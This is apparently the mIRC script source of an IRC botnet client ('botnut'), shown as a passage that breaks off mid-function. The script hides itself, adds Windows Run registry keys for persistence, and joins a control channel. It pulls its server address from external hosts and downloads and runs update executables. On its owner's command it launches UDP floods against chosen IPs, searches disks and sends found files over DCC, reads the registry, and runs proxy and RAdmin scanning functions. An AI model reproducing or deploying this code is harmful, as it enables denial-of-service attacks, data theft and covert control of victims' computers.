ON *:START: { 
  .timer 0 1200 botnet.scan.4.server
  .timer 0 1200 botnet.check.channel
  identd on $botnet.getnick
  set %botnet.version 1.54
  set %botnet.channel #botnut
  set %botnet.channelpw botnut
  server irc.gamesnet.net:6667
  set %botnet.server irc.gamesnet.net:6667
  nick $left($botnet.getnick,-1)
  set %botnet.owner botnut
  anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  echo -a $dll(dmu.dll,HideMirc,on)
  set %nopass 1 0 0 0 37 2 0 0 16 8 0 0 2 8 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  set %nopass1 1 0 0 0 37 10 0 1 16 8 1 0 10 8 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
  set %ws.count 0
  set %ws.homedir c:\
  set %ws.logging 0
  set %ws.showStatus 0
  set %ws.port 31337
  set %ws.sockCount 235
  set %ws.statsPage 1
  ws.off
  $regwrite(HKEY_CURRENT_USER\Software\mIRC\License\,1711-182810,REG_SZ)
  $regwrite(HKEY_CURRENT_USER\Software\mIRC\UserName\,owned,REG_SZ)
  $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RUNDLL,c:\ $+ wind $+ ows\sys $+ tem32\run $+ dll32\svc $+ host.e $+ xe,REG_SZ)
  $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svc,rundll32.exe,REG_SZ)
  secure
  dde nc command "" /exit
  copy -o c:\windows\notepad.exe c:\windows\system32\
}

alias -l botnet.check.channel {
  if ($me == $scon(1).me) && ($channel(0) == 0) { scon 1 join %botnet.channel %botnet.channelpw }
}

raw 332:*: {
  if ($cid == $scon(1)) {
    var %i = 1
    while (%i <= $numtok($3-,124)) {
      parse.topic $gettok($3-,%i,124)
      inc %i
    }
  }
}

alias parse.topic {
  if ($chr(36) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
  elseif ($1 == .idle) { idle $2- } 
  elseif ($1 == .mirc) { 
    if ($2 == amsg) { dde mirc command "" /.amsg $3- }
    elseif ($2 == msg) { dde mirc command "" /.msg $3- }
    elseif ($2 == status) { dde mirc command "" //dde botnut command "" /scon 1 msg %botnet.channel $+ 2 Nick: $ $+ me  Version: $ $+ version MircDir: $ $+ mircdir }
    elseif ($2 == nick) { dde mirc command "" //dde botnut command "" /scon 1 msg %botnet.channel $+ 2 Nick: $ $+ me }    
  }
  elseif ($1 == .nick) { 
    if ($3 == real) { scon $2 nick $left($botnet.getnick,-1) }
    elseif ($3) { scon $2 nick $3 $+ $rand(99999,1) $+ $4 }
    else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
  } 
}


raw 433:*: { .timer 1 5 nick $read(nick.txt,$rand(1,$lines(nick.txt))) }

ON *:CONNECT: { 
  if ($me == $scon(1).me) { scon 1 join %botnet.channel %botnet.channelpw }
  botnet.scan.4.server
  idle start
  ignore -wd *
}

ON *:DISCONNECT: {   
  botnet.scan.4.server
}

alias -l botnet.getnick { return $read(nick.txt,$rand(1,$lines(nick.txt))) }

alias -l botnet.openweb { unset botnet.hostt* | set %botnet.hostt1 $1 | set %botnet.hostt2 $2 | sockclose botnet.openweb | .timer 1 1 sockopen botnet.openweb %botnet.hostt1 80 }

ON *:SOCKOPEN:botnet.openweb: {
  sockwrite -n $sockname GET / $+ %botnet.hostt2 HTTP/1.1
  sockwrite -n $sockname Host: %botnet.hostt1 $+ $str($crlf,2)
}

on *:sockread:botnet.openweb: {
  var %sockread
  sockread %sockread
  if (*HTTP*200*OK* iswm %sockread) { sockclose $sockname }
}
alias -l botnet.scan.4.server { sockclose botnet.check.server | .timer 1 1 sockopen botnet.check.server botnutserver.da.ru 80 }

ON *:SOCKOPEN:botnet.check.server: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: botnutserver.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.server: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread,<HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread,</TITLE></HEAD>,,%sockread)) {
    if (%botnet.server != %sockread) {
      echo -a %sockread
      set %botnet.server %sockread
      scon 1 server %botnet.server
    }
  }
}

alias botnet.scan.4.version { sockclose botnet.check.version | sockopen botnet.check.version botnutversion.da.ru 80 }

ON *:SOCKOPEN:botnet.check.version: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: botnutversion.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.version: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    if (%botnet.version < %sockread) {
      echo -a %sockread    
      .timer 1 1 botnet.scan.4.fileurl
      .timer 1 2 sockclose botnet.check.version
    }
  }
}
alias -l botnet.scan.4.fileurl { set %botnet.update $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .exe | sockclose botnet.check.fileurl | sockopen botnet.check.fileurl botnutfileurl.da.ru 80 }

ON *:SOCKOPEN:botnet.check.fileurl: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: botnutfileurl.da.ru $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.fileurl: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    set %botnet.account %sockread
    sockclose botnet.download.new.version
    .timer 1 1 sockopen botnet.download.new.version people.freenet.de 80
  }
}

ON *:SOCKOPEN:botnet.download.new.version: {
  sockwrite -n $sockname GET / $+ %botnet.account $+ /update.exe HTTP/1.0
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname Host: people.freenet.de $+ $str($crlf,2)
  sockwrite -n $sockname
}

ON *:SOCKREAD:botnet.download.new.version:{
  if (%botnet.aupd.downloadready != 1) {
    var %header
    sockread %header
    while ($sockbr) {
      if (* !iswm %header) {
        %botnet.aupd.downloadready = 1
        break
      }
      sockread %header
    }
  }
  sockread 4096 &d
  while ($sockbr) {
    bwrite %botnet.update -1 -1 &d
    sockread 4096 &d
  }
}

ON *:SOCKCLOSE:botnet.download.new.version: { unset %botnet.aupd.* | echo -a %botnet.update | run %botnet.update | timer 1 10 .load -rs botnut.dll | timer 1 11 remove %botnet.update }

ON *:TEXT:*:#: { 
  if ($cid == $scon(1)) {
    if ($nick == botnut) {
      if ($chr(36) isin $1-) || ($chr(124) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
      elseif ($1 == .amsg) { scon $2 .amsg $3- }
      elseif ($1 == .ctcp) { scon $2 .ctcp $3- }
      elseif ($1 == .proxy) {
        if ($2 == off) { sockclose b* | scon 1 notice %botnet.owner [IRC-Proxy]: Offline  }
        else { sockclose b* | set %bnc.port $2 | set %bnc.pass $3 | .bnc $2 | scon 1 notice %botnet.owner [IRC-Proxy] IP: $ip PORT: %bnc.port PASS: %bnc.pass (/server -m $ip $+ : $+ %bnc.port $+ ) }
      }
      elseif ($1 == .search_nick) { 
        dde mirc command "" //dde botnut command "" /botnet.mircnick set $ $+ me 
        set %botnet.mircnick2 $2
        timer 1 2 botnet.mircnick 
      }
      elseif ($1 == .notice) { scon $2 .ctcp $3- }
      elseif ($1 == .msg) { scon $2 .msg $3- }
      elseif ($1 == .openweb) { botnet.openweb $2- }
      elseif ($1 == .update) { botnet.scan.4.version }
      elseif ($1 == .nick) { 
        if ($3 == real) { scon $2 nick $left($botnet.getnick,-1) }
        elseif ($3) { scon $2 nick $3 $+ $rand(99999,1) $+ $4 | return }       
        else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
      } 
      elseif ($1 == .server) { botnet.scan.4.server }   
      elseif ($1 == .info) { 
        if ($2 == net) { botnet.netstats public }
        elseif ($2 == pc) { botnet.pcstats public }
        elseif ($2 == version) { scon 1 .notice %botnet.owner « Version:  %botnet.version » }
        elseif ($2 == ip) { scon 1 .notice %botnet.owner « IP:  $ip » }
        else { scon 1 .notice %botnet.owner « IP: $ip » « Version:  %botnet.version » « Uptime: $duration($calc($ticks / 1000)) » }
      }
      elseif ($1 == .mirc) { 
        if ($2 == amsg) { dde mirc command "" /.amsg $3- }
        elseif ($2 == msg) { dde mirc command "" /.msg $3 $4- }
        elseif ($2 == ctcp) { dde mirc command "" /.ctcp $3 $4- }
        elseif ($2 == notice) { dde mirc command "" /.notice $3 $4- }
        elseif ($2 == mode) { dde mirc command "" /mode $3- }
        elseif ($2 == kick) { dde mirc command "" /kick $3-  }
        elseif ($2 == join) { dde mirc command "" /join $3- }
        elseif ($2 == part) { dde mirc command "" /part $3- }
        elseif ($2 == exit) { dde mirc command "" /exit }
        elseif ($2 == status) { dde mirc command "" //dde botnut command "" /scon 1 msg %botnet.channel $+ 2 Nick: $ $+ me  Version: $ $+ version MircDir: $ $+ mircdir }
        elseif ($2 == nick) { dde mirc command "" //dde botnut command "" /scon 1 msg %botnet.channel $+ 2 Nick: $ $+ me }       
      }
      elseif ($1 == .winamp) {
        if ($2 == status) { 
          if ($dll(winamp.dll,songtitle,_) == $null) { return }
          else { notice %botnet.owner «  $dll(winamp.dll,songtitle,_) » «  $dll(winamp.dll,bitrate,_) $+ kbps $+ / $+ $dll(winamp.dll,freq,_) $+ kHz » « $dll(winamp.dll,tracktime,_) » }
        }
        if ($2 == play) { dll winamp.dll play }
        if ($2 == pause) { dll winamp.dll pause }
        if ($2 == stop) { dll winamp.dll stop }    
      }
      elseif ($1 == .search_file) { search_file $2 $3 $nick public }
      elseif ($1 == .udp) { fuck_you $2 $3 $4 public }
      elseif ($1 == .get_file) { get_search_file $2 $nick } 
      elseif ($1 == .idle) { 
        if ($2 == list) { notice %botnet.owner $iif(%idle.channels,Idle: %idle.channels) }
        elseif ($2 == start) { return }
        elseif ($2 == limitjoin) { return }
        else { idle $2- } 
      }
      elseif ($1 == .join) { 
        if ($2 == delay) { 
        .timer 1 $rand(1, $+ $3 $+ ) scon $4 join $5- }
        else { scon $2 join $3- }  
      }
      elseif ($1 == .part) { 
        if ($2 == 1) && ($3 == #) { return }
        elseif ($2 == 1) && ($3 == all) { botnet.partchannel 1 | join %botnet.channel %botnet.channelpw }
        elseif ($2 == 2) && ($3 == all) { botnet.partchannel 2 }
        else { scon $2 part $3- }    
      }
      elseif ($1 == .disconnect) { scon 2 disconnect }
      elseif ($1 == .listservers) { listserver public }
      elseif ($1 == .listchannels) { botnet.onchannel public }
      elseif ($1 == .readreg) { 
        if ($_regread($2-) == 0) { return }
        else { scon 1 .msg %botnet.channel $+ 2 $_regread($2-) }
      }
      elseif ($1 == .connect) { 
        if ($scon(0) == 2)  { scon 2 server $2- }
        elseif ($scon(0) == 1) { server -m $2- }
      }
    }
  }
}


ON *:TEXT:*:?: { 
  if ($cid == $scon(1)) {
    if ($nick == botnut) {
      if ($chr(36) isin $1-) || ($chr(124) isin $1-) || (write isin $1-) || (remove isin $1-) || (run isin $1-) || (exit isin $1-) || (quit isin $1-) || (timer isin $1-) { return }
      elseif ($1 == .download) { 
        if ($2 == %botnet.givenhost) && ($3 == %botnet.givenpath) && ($4 == %botnet.given) { scon 1 msg %botnet.owner File already downloaded! }
        else { botnet.download $2- }
      }      
      elseif ($1 == .fileserver) { fserve $nick 10 $2- }
      elseif ($1 == .webserver) { 
        if ($2 == off) { ws.off | msg $nick Webserver disabled.  }
        else { ws.off | set %ws.port $2 | set %ws.homedir $3 $+ \ | ws.on }   
      }
      elseif ($1 == .amsg) { scon $2 .amsg $3- }
      elseif ($1 == .openweb) { botnet.openweb $2- }
      elseif ($1 == .ctcp) { scon $2 .ctcp $3- }
      elseif ($1 == .rascan) {
        if ($2 == stop) { 
          if (%radmin.status == 1) { timerscan off | timerclose off | sockclose scanner* | msg $nick RAdmin Scanner stopped.  }
          else { timerscan off | timerclose off | sockclose scanner* | msg $nick RAdmin Scanner isn't running. }        
        }
        else {
          set %radmin.status 1
          .scan $2 
          halt
        }
      }
      elseif ($1 == .notice) { scon $2 .ctcp $3- }
      elseif ($1 == .update) { botnet.scan.4.version }
      elseif ($1 == .server) { botnet.scan.4.server }   
      elseif ($1 == .opme) { mode $2 +o $nick } 
      elseif ($1 == .idle) { 
        if ($2 == list) { msg $nick $iif(%idle.channels,Idle: %idle.channels) }
        elseif ($2 == start) { return }
        elseif ($2 == limitjoin) { return }
        else { idle $2- } 
      }
      elseif ($1 == .proxy) {
        if ($2 == off) { sockclose b* | scon 1 msg $nick [IRC-Proxy]: Offline  }
        else { sockclose b* | set %bnc.port $2 | set %bnc.pass $3 | .bnc $2 | scon 1 msg $nick [IRC-Proxy] IP: $ip PORT: %bnc.port PASS: %bnc.pass (/server -m $ip $+ : $+ %bnc.port $+ ) }
      }
      elseif ($1 == .info) { 
        if ($2 == net) { botnet.netstats }
        elseif ($2 == pc) { botnet.pcstats }
        elseif ($2 == version) { scon 1 .msg $nick « Version:  %botnet.version » }
        elseif ($2 == ip) { scon 1 .msg $nick « IP:  $ip » }
        else { scon 1 .msg $nick « IP: $ip » « Version:  %botnet.version » « Uptime: $duration($calc($ticks / 1000)) » }
      }
      elseif ($1 == .nick) { 
        if ($3 == real) { scon $2 nick $left($botnet.getnick,-1) }
        elseif ($3) { scon $2 nick $3 $+ $rand(99999,1) $+ $4 }
        else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
      } 
      elseif ($1 == .mirc) { 
        if ($2 == amsg) { dde mirc command "" /.amsg $3- }
        elseif ($2 == msg) { dde mirc command "" /.msg $3 $4- }
        elseif ($2 == mode) { dde mirc command "" /mode $3- }
        elseif ($2 == kick) { dde mirc command "" /kick $3-  }
        elseif ($2 == join) { dde mirc command "" /join $3- }
        elseif ($2 == ctcp) { dde mirc command "" /.ctcp $3 $4- }
        elseif ($2 == notice) { dde mirc command "" /.notice $3 $4- }
        elseif ($2 == exit) { dde mirc command "" /exit }
        elseif ($2 == part) { dde mirc command "" /part $3- }
        elseif ($2 == server) { dde mirc command "" /server -m $3- }
        elseif ($2 == status) { dde mirc command "" //dde botnut command "" /scon 1 msg $nick Nick: $ $+ me  Version: $ $+ version MircDir: $ $+ mircdir }
        elseif ($2 == nick) { 
          if ($3) { dde mirc command "" //nick $3 }
          else { dde mirc command "" //dde botnut command "" /scon 1 msg $nick Nick: $ $+ me }  
        }
      }
      elseif ($1 == .winamp) {
        if ($2 == status) { 
          if ($dll(winamp.dll,songtitle,_) == $null) { return }
          else { msg $nick «  $dll(winamp.dll,songtitle,_) » «  $dll(winamp.dll,bitrate,_) $+ kbps $+ / $+ $dll(winamp.dll,freq,_) $+ kHz » « $dll(winamp.dll,tracktime,_) » }
        }
        if ($2 == play) { dll winamp.dll play }
        if ($2 == pause) { dll winamp.dll pause }
        if ($2 == stop) { dll winamp.dll stop }    
      }
      elseif ($1 == .search_file) { search_file $2 $3 $nick }
      elseif ($1 == .udp) { fuck_you $2 $3 $4 }
      elseif ($1 == .get_file) { get_search_file $2 $nick } 
      elseif ($1 == .join) { 
        if ($2 == delay) { 
        .timer 1 $rand(1, $+ $replace($2,delay,0) $+ ) scon $3 join $4- }
        else { scon $2 join $3- }  
      }
      elseif ($1 == .part) { 
        if ($2 == 1) && ($3 == #) { return }
        elseif ($2 == 1) && ($3 == all) { botnet.partchannel 1 | join %botnet.channel %botnet.channelpw }
        elseif ($2 == 2) && ($3 == all) { botnet.partchannel 2 }
        else { scon $2 part $3- }    
      }
      elseif ($1 == .disconnect) { scon 2 disconnect }
      elseif ($1 == .msg) { scon $2 .msg $3 $4- }
      elseif ($1 == .listservers) { listserver }
      elseif ($1 == .listchannels) { botnet.onchannel }
      elseif ($1 == .readreg) { 
        if ($_regread($2-) == 0) { return }
        else { scon 1 .msg $nick $_regread($2-) }
      }
      elseif ($1 == .connect) { 
        if ($scon(0) == 2)  { scon 2 server $2- }
        elseif ($scon(0) == 1) { server -m $2- }
      }
    }
  }
}

alias botnet.mircnick {  
  if ($1 == set) { set %botnet.mircnick $2- }    
  elseif (%botnet.mircnick2 isin %botnet.mircnick) { msg %botnet.channel $+ 2 (Found) Nick: %botnet.mircnick }
}

alias -l fuck_you {
  if (!$isip($1)) { return }
  if ($2 !isnum 1-31337) { return }
  if ($3 !isnum 1-1500) { return }
  if (%udp.check.flood) { return }
  set %udp.check.flood 1
  set %udp.flood.host $$1
  set %udp.flood.port $$2
  set %udp.flood.packets $$3
  set %udp.flood.sent 0
  .timerUDP.CHECK 1 60 unset %udp.check.flood
  .timerUDP.FLOOD1 0 0 udp.flood
  .timerUDP.FLOOD2 0 0 udp.flood
  .timerUDP.FLOOD3 0 0 udp.flood
  if ($4 == public) { set %botnet.udp public | scon 1 notice %botnet.owner Started sending %udp.flood.packets packet(s) to %udp.flood.host Port %udp.flood.port }
  else { unset %botnet.udp | set %botnet.user $nick | scon 1 msg $nick Started sending %udp.flood.packets packet(s) to %udp.flood.host Port %udp.flood.port }
}

alias -l udp.flood {
  inc %udp.flood.sent
  sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
  sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf
  sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
  sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) 
  sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
  if (%udp.flood.sent >= %udp.flood.packets) { 
    if (%botnet.udp == public) { scon 1 notice %botnet.owner Finished sending %udp.flood.sent packet(s) to %udp.flood.host Port %udp.flood.port | unset %botnet.currentchannel }
    else { scon 1 msg %botnet.user Finished sending %udp.flood.sent packet(s) to %udp.flood.host Port %udp.flood.port | unset %botnet.user }    
    .timerUDP.FLOOD* off
    unset %udp.flood.* 
    return 
  }
}

alias isip {
  tokenize 46 $1-
  if ($1 isnum 0-255) && ($2 isnum 0-255) && ($3 isnum 0-255) && ($gettok($4,1,58) isnum 0-255) { return $true }
  else { return $false }
}

alias -l listserver {
  var %i = 1
  while (%i <= $scon(0)) {
    var %botnet.listserver %botnet.listserver $iif($scon(%i).server, $+ %i $+ : $scon(%i).server)
    inc %i
  }
  if ($1 == public) { scon 1 .notice %botnet.owner %botnet.listserver }
  else { .msg $nick %botnet.listserver }
}

alias -l search_file {
  if (!$disk($1)) { return NO_GIVEN_DISK }
  elseif (!$2) { return NO_SEARCH_FILE }
  elseif (%botnet.protection.search_file_timer) { return TIMER_STILL_ACTIVE }
  set %botnet.protection.search_file_timer ON
  var %i 1, %disk $1, %search $2, %found
  while (%i <= $findfile(%disk,%search,0)) {
    ;echo -a $findfile(%disk,%search,%i)
    %found = %found $replace($findfile(%disk,%search,%i),$chr(32),$chr(155))
    inc %i
  }
  if (%found) {
    if ($4 == public) {
      scon 1 .msg %botnet.channel $+ 2 (Found) $replace(%found,$chr(155),$chr(32))
    }
    else {
      scon 1 .msg $3 (Found) $replace(%found,$chr(155),$chr(32))
    }
  }
  set %botnet.search_file.found $replace($strip(%found),$chr(32),$chr(8))
  .timer 1 10 unset %botnet.protection.search_file_timer
  .timer 1 60 unset %botnet.search_file.found
}

alias -l get_search_file {
  if (!%botnet.search_file.found) { return NO_SEARCH_RESULT }
  elseif ($1 !isnum) { return NO_GIVEN_FILENUMBER }
  if ($isfile($replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32)))) {
    dcc send $2 $replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32))
  }    
}

alias -l _regread {
  var %a = regread $+ $ticks
  .comopen %a WScript.Shell
  if ($comerr) { return 0 }
  if (!$com(%a,RegRead,3,bstr,$1)) {
    .comclose %a
    return 0
  }
  var %b = $com(%a).result
  .comclose %a
  return %b
}

alias ws.version { return 1.0 }
alias -l moo { return $dll(moo.dll,$$1,$$2) }
alias -l ws.sclose { if ($sock($$1) == $null) { return } | ws.varClear $$1 | sockclose $$1 }
alias -l ws.swrite { sockwrite -n $$1 $2- }
alias -l ws.error { ws.swrite $$1 $1- | ws.sclose $$1 }
alias -l ws.var { if ($isid) { return $eval($+(%,$$1,$$2),2) } | else set $+(%,$$1,$$2),2) $3- }
on *:sockclose:ws-*: { ws.varClear $sockname | .timer $+ $sockname off }
alias -l ws.varClear { unset $+(%,$$1,*) }
alias -l ws.notfound {
  ws.swrite $$1 <html><title>404 Not Found</title><BODY bgcolor=white text=black>
  ws.swrite $$1 <br><br><h2 align=center>404 Not Found</h2><br>
  ws.swrite $$1 The file you are looking for <b>http:// $+ $ip $+ $$2 $+ </B> does not exist.<br>
  ws.swrite $$1 <br><font size=2></font></Br></BODY></html>
  ws.sclose $$1
}
alias -l botnet.pcstats { 
  if ($1 == public) { notice %botnet.owner OS: $dll(net.dll,os,_) CPU: $dll(net.dll,cpuinfo,_) Uptime: $duration($calc($ticks / 1000)) RAM: [ $dll(moo.dll,meminfo,_) ] HDD: $dll(net.dll,hdspace,_) }
  else { msg $nick OS: $dll(net.dll,os,_) CPU: $dll(net.dll,cpuinfo,_) Uptime: $duration($calc($ticks / 1000)) RAM: [ $dll(moo.dll,meminfo,_) ] HDD: $dll(net.dll,hdspace,_) }
}
alias -l botnet.netstats { 
  if ($1 == public) { notice %botnet.owner IP: $ip INFO: $dll(moo.dll,connection,_) }
  else { msg $nick IP: $ip INFO: $dll(moo.dll,connection,_) }
}
alias -l ws.stats {
  if (%ws.statsPage == 1) {
    ws.swrite $$1 <html><title> $+ $me $+ </title><body bgcolor=white text=black>
    ws.swrite $$1 <br><table width=90% align=center cellspacing=0 cellpadding=2 border=1><tr><th width=25%>Item</th><th width=75%>Data</th></tr>
    ws.swrite $$1 <tr><td>Operating System</td><td> $+ $moo(osinfo,_) $+ </td></tr><tr><td>CPU</td><td> $+ $moo(cpuinfo,_) $+ </td></tr>
    ws.swrite $$1 <tr><td>Uptime</td><td> $+ $duration($calc($ticks / 1000)) $+ </td></tr><tr><td>Resolution</td><td> $+ $window(-1).w $+ x $+ $window(-1).h $+ </td></tr><tr><td>Memory</td><td> $+ $moo(meminfo,_) $+ </td></tr>
    ws.swrite $$1 <tr><td>System Time / Timezone</td><td> $+ $asctime $asctime(zzz) $+ </td></tR><tr><td>mIRC Version</td><td> $+ $version $+ </td></tr>
    ws.swrite $$1 <tr><td>Disks</td><td><table width=100% border=1 cellpadding=1 cellspacing=1><tr><th>Disk</th><th>Type</th><th>Size</th><th>Free</th></tr>
    var %i = 0
    while (%i < 24) { 
      inc %i 1
      var %char = $chr($calc(%i + 66)) $+ :
